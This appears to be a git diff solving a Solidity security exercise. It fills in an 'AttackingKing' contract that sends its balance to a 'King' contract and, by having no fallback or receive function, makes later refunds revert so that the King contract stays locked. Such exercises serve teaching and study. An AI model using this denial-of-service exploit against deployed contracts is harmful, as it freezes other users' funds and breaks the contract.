@@ -4,13 +4,16 @@ import "./King.sol";
 import "hardhat/console.sol";
 
 contract AttackingKing {
-    address public contractAddress;
+    address contractAddress;
 
     constructor(address _contractAddress) payable {
         contractAddress = _contractAddress;
     }
 
     function hackContract() external {
-        // Code me!
+        // since AttackingKing has no fallback or receive function,
+        // king.transfer will fail and revert, preventing refunds
+        // and new kings
+        contractAddress.call{value: address(this).balance}("");
     }
 }
